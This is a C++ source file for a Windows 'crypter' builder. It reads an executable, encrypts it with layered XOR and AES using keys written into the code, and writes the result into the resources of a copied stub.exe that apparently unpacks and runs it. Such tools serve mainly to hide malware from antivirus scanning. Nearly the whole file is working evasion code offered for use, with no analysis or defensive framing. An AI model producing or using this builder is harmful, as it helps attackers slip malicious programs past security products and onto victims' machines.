/**
Copyright (c) <2013, <Penguin>
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met: 

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer. 
2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution. 

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

The views and conclusions contained in the software and documentation are those
of the authors and should not be interpreted as representing official policies, 
either expressed or implied, of the FreeBSD Project.
**/



/**
 * Research:
 * http://stackoverflow.com/questions/20365005/c-xor-encryption
 * http://www.security.org.sg/code/loadexe.html
 * 
 * Credits:
 * -igitalNemesis
 * -Grigori Perelman
 * -MicroPenguin
 * -Original Unknown
 * -Joe Z          (http://stackoverflow.com/users/2354107/joe-z)
 * */


#pragma warning (disable:4996)
#include <iostream>
#include <Windows.h>
#include <fstream>
#include <vector>
#include <string>
#include "VirtualAES.h"
#include <iterator>
#include "huffman.h"


using namespace std;

char * FB; //The Buffer that will store the File's data
DWORD fs; // We will store the File size here
char output[MAX_PATH];
char choice;
DWORD dwBytesWritten = 0;
char name[MAX_PATH];   // We will store the Name of the Crypted file here

std::vector<char> file_data;  // With your current program, make this a global.


void RDF() //The Function that Reads the File and Copies the stub
{
	DWORD bt;
								
	cout << "Please enter the Path of the file \nIf the file is in the same folder as the builder\nJust type the file name with an extention\nEG: Stuff.exe\n";
	cout << "File Name: ";
	cin >> name; // Ask for input from the user and store that inputed value in the name variable
	//depuracion
	//nombre = "calc.exe";
	//
	cout << "Enter output name: ";
	cin >> output;
	CopyFile("stub.exe", output/*L"Crypted.exe"*/, 0);// Copy stub , so we done need to download a new one each time we crypt
	// ofcourse we can just update the resources with new data but whatever
	cout << "\nGetting the HANDLE of the file to be crypted\n";
	HANDLE efile = CreateFileA(name, GENERIC_ALL,FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);	
	//^ Get the handle of the file to be crypted
	cout << "Getting the File size\n";
	fs = GetFileSize(efile, NULL);
	//Get its size , will need to use it for the encryption and buffer that will store that Data allocation
	cout << "The File Size is: ";
	cout << fs;
	cout << " Bytes\n";
	cout << "Allocating Memory for the ReadFile function\n";
	file_data.resize(fs);  // set vector length equal to file size
	cout << "Reading the file\n";
	//ReadFile(efile, FB, fs, &bt, NULL);//Read the file (put the files data in to a FB buffer)

	ReadFile(efile, (LPVOID)(file_data.data()), fs, &bt, NULL);

	CloseHandle(efile);//close the handle

	if (fs != bt)
		cout << "Error reading file!" << endl;
}

void xor_crypt(const std::string &key, std::vector<char> &data)
{
	for (size_t i = 0; i != data.size(); i++)
		data[i] ^= key[i % key.size()];

	/*ofstream out("After_enc.dat");
	for (std::vector<char>::const_iterator it = data.begin(), itEnd = data.end(); it != itEnd; ++it)
		out << *it;*/
}

/**
 * @brief MainWindow::encrypt
 * @param rawData
 *
 * AES-256 Bit Encryption. Block Size 128 Bit, Key 256 Bit.
 *
 */
void encrypt(std::vector<char> rawData)
{
	//256 Bit Key
	unsigned char key[KEY_256] = "S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>";

	unsigned char plaintext[BLOCK_SIZE];
	unsigned char ciphertext[BLOCK_SIZE];

	aes_ctx_t* ctx;
	virtualAES::initialize();
	ctx = virtualAES::allocatectx(key, sizeof(key));

	int count = 0;
	int index = file_data.size() / 16; //Outer loop range
	int innerCount = 0;
	int innerIndex = 16; //We encrypt&copy 16 Bytes for once.
	int dataIndex = 0; //Non resetting @rawData index for encryption
	int copyIndex = 0; //Non resetting @rawData index for copying encrypted data.


	for (count; count < index; count++)
	{
		for (innerCount = 0; innerCount < innerIndex; innerCount++)
		{
			plaintext[innerCount] = rawData[dataIndex];
			dataIndex++;
		}

		virtualAES::encrypt(ctx, plaintext, ciphertext);

		for (innerCount = 0; innerCount < innerIndex; innerCount++)
		{
			rawData[copyIndex] = ciphertext[innerCount];
			copyIndex++;
		}
	}

	delete ctx;
}

void compresionHuffman(const char* input_file, const char* output_file)//std::vector<char> rawData)
{
	HuffmanCompressor(input_file).compress(output_file);
}

void choose_enc()
{
	//Asks users for encryption method
	cout << "\n\nChoose encryption method: " << endl;
	cout << "1. N/A" << endl;
	cout << "2. Simple XOR" << endl;
	cout << "3. Simple AES" << endl;
	cout << "4. Simple XOR && AES" << endl;
	cout << "5. Simple AES && XOR" << endl;
	//cout << "6. Simple HUFFMAN" << endl;
	cout << "6. Simple XOR && AES && XOR" << endl;
	cin >> choice;
}

void enc() // The function that Encrypts the info on the FB buffer
{
	cout << "Encrypting the Data\n";

	switch (choice)
	{
	case '1':
	break;
	case '2':
	{
		/*ofstream myfile("2.dat");
		for (std::vector<char>::const_iterator it = file_data.begin(), itEnd = file_data.end(); it != itEnd; ++it)
			myfile << *it;*/
		xor_crypt("penguin", file_data); //Encrypt it
	}
	break;
	case '3':
	{
		encrypt(file_data);
	}
	break;
	case '4':
	{
		xor_crypt("penguin", file_data); //Encrypt it
		encrypt(file_data);
	}
	break;
	case '5':
	{
		encrypt(file_data);
		xor_crypt("penguin", file_data); //Encrypt it
	}
		break;
	case '6':
	{
		//compresionHuffman(name, output);
		xor_crypt("penguin", file_data); //Encrypt it
		encrypt(file_data);
		xor_crypt("elephant", file_data); //Encrypt it
		encrypt(file_data);
		xor_crypt("Qwe,.-123%&/()", file_data); //Encrypt it
	}
	break;
		return;
	}
}

void WriteToResources(LPTSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize) // Function that Writes Data to resources 
{
	cout << "Writing Encrypted data to stub's resources\n";
	HANDLE hResource = NULL;
	hResource = BeginUpdateResource(szTargetPE, FALSE);
	//LPVOID lpResLock = LockResource(lpBytes);
	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),(LPVOID)lpBytes, dwSize);
	EndUpdateResource(hResource, FALSE);
}

int main() // The main function (Entry point)
{
	std::string key = "penguin";
	RDF(); //Read the file
	choose_enc();
	enc();
	file_data.push_back(choice);
	cout << fs << endl;
	WriteToResources(output, 10, (BYTE *)file_data.data(), file_data.size());
	cout << "Your File Got Crypted\n";
	system("PAUSE");
}

